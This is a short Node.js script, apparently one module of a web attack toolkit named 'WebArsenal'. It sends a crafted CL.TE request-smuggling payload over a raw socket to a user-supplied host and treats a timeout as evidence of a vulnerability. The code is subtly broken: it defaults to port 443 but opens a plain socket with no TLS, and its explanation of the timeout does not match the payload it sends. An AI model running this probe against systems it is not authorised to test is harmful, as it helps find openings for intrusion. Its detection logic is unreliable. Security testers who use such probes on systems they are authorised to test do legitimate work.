#!/usr/bin/env node
/**
 * ╔═════════════════════════════════════════════════════════════════╗
 * ║  WebArsenal: http-smuggling-tester.js                            ║
 * ║  Category: analyzers                                            ║
 * ╚═════════════════════════════════════════════════════════════════╝
 */

'use strict';

const { program } = require('commander');
const chalk = require('chalk');
const net = require('net');

program
  .name('http-smuggling-tester.js')
  .description('Tests for potential HTTP Request Smuggling (CL.TE / TE.CL) vulnerabilities.')
  .version('3.0.0')
  .requiredOption('-u, --url <url>', 'Target URL or host')
  .option('-p, --port <number>', 'Port number', '443')
  .parse(process.argv);

const opts = program.opts();

async function testSmuggling(host, port, payload) {
  return new Promise((resolve) => {
    const client = new net.Socket();
    client.setTimeout(5000);
    
    client.connect(port, host, () => {
      client.write(payload);
    });
    
    client.on('data', (data) => {
      resolve({ status: 'RESPONSE', data: data.toString() });
      client.destroy();
    });
    
    client.on('timeout', () => {
      resolve({ status: 'TIMEOUT' });
      client.destroy();
    });
    
    client.on('error', (err) => {
      resolve({ status: 'ERROR', error: err.message });
      client.destroy();
    });
  });
}

async function run() {
  console.log(chalk.bold.magenta('\n╔════════════════════════════════════════════╗'));
  console.log(chalk.bold.magenta(  '║  WebArsenal Module: ' + 'http-smuggling-tester.js'.padEnd(23) + '║'));
  console.log(chalk.bold.magenta(  '╚════════════════════════════════════════════╝\n'));
  
  const host = opts.url.replace(/^https?:\/\//, '').split('/')[0];
  const port = parseInt(opts.port);
  
  console.log(chalk.cyan(`[*] Testing HTTP Smuggling (CL.TE) on: ${host}:${port}\n`));
  
  const clTePayload = `POST / HTTP/1.1\r\n` +
                      `Host: ${host}\r\n` +
                      `Content-Length: 4\r\n` +
                      `Transfer-Encoding: chunked\r\n` +
                      `Connection: keep-alive\r\n\r\n` +
                      `0\r\n\r\n` +
                      `G`;

  const res = await testSmuggling(host, port, clTePayload);
  
  if (res.status === 'TIMEOUT') {
    console.log(chalk.bold.red(`[!] POTENTIAL CL.TE VULNERABILITY: TIMEOUT DETECTED.`));
    console.log(chalk.red(`    Server timed out waiting for the smuggled 'G'.`));
  } else if (res.status === 'RESPONSE') {
    console.log(chalk.green(`\n[✓] Server responded normally. Basic CL.TE not detected.`));
  } else {
    console.log(chalk.red(`\n[x] Error: ${res.error}`));
  }
}

if (require.main === module) { run().catch(console.error); }
module.exports = { run };
